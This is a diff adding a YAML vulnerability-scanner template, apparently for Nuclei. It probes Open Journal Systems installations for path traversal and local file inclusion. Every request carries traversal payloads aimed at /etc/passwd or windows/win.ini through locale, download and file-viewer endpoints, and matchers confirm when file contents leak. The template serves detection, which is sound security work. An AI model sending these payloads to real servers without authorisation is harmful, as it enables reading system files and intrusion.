@@ -1,0 +1,95 @@
+id: ojs-lfi-path-traversal
+
+info:
+  name: OJS Local File Inclusion / Path Traversal
+  author: OJS-Security-Scanner
+  severity: high
+  description: |
+    Deteksi Local File Inclusion (LFI) dan Path Traversal pada OJS.
+    Test berbagai endpoint yang menerima path atau locale sebagai parameter,
+    mencoba untuk mengakses file sistem seperti /etc/passwd.
+  tags:
+    - ojs
+    - lfi
+    - path-traversal
+    - file-inclusion
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+
+http:
+  # Test 1: Path traversal via locale parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/locale/setLocale?source=%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/index.php/index/locale/setLocale?source=../../../../etc/passwd"
+      - "{{BaseURL}}/index.php/index/?locale=../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:x:0:0"
+          - "daemon:[^:]*:[^:]*:[^:]*:"
+          - "nobody:[^:]*:[^:]*:[^:]*:"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  # Test 2: Path traversal via download endpoint
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/article/download/1/1/../../../etc/passwd"
+      - "{{BaseURL}}/index.php/index/article/download/..%2F..%2F..%2Fetc%2Fpasswd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:x:0:0"
+          - "daemon:[^:]*:[^:]*:[^:]*:"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  # Test 3: Path traversal via file viewer
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/article/viewFile/1/../../../etc/passwd"
+      - "{{BaseURL}}/index.php/index/article/viewFile/../../../../etc/passwd/1"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:x:0:0"
+          - "daemon:[^:]*:[^:]*:"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  # Test 4: Windows path traversal (untuk OJS di Windows Server)
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/?locale=..%5C..%5C..%5Cwindows%5Cwin.ini"
+      - "{{BaseURL}}/index.php/index/?locale=../../../../windows/win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "[extensions]"
+          - "[fonts]"
+          - "[mail]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
